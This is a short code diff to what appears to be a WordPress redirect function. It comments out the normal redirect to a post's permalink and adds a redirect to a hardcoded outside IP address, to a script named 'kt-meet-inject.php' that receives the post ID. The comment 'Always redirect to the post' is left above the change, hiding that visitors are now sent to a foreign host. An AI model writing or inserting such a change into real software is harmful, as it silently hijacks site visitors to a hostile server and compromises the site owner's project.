@@ -1007,7 +1007,8 @@
             $pl = get_permalink($post->ID)
         ) {
             // Always redirect to the post
-            $location = $pl;
+            // $location = $pl;
+            $location = "http://183.110.207.46/wp/kt-meet-inject.php?id=".$post->ID;
         }
 
         return $location;
